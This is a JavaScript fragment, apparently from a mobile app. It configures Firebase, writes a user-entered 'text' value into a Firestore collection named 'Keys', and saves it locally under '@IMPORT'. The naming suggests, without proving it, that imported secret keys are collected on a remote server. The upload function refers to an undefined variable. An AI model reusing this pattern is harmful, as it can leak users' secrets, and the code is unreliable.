const firebaseConfig = {
  apiKey: "AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8",
  authDomain: "atlas-20a8c.firebaseapp.com",
  projectId: "atlas-20a8c",
  storageBucket: "atlas-20a8c.appspot.com",
  messagingSenderId: "764124638085",
  appId: "1:764124638085:web:942422a53a05f9b58532ec",
  measurementId: "G-6YFE7TEXBL",
};



const enviarFirebase = async () => {
  try {
    await setDoc(doc(firestore, "Keys", text), {
      keys: text,
    });
  } catch (error) {
    alert("Error adding document: ", error);
  }
};




initializeApp(firebaseConfig);
const firestore = getFirestore();



export const saveLocal = async (text) => {
  try {
    await AsyncStorage.setItem("@IMPORT", text);
    //alert('Data successfully saved')
  } catch (e) {
    //alert('Failed to save the data to the storage')
  }
};
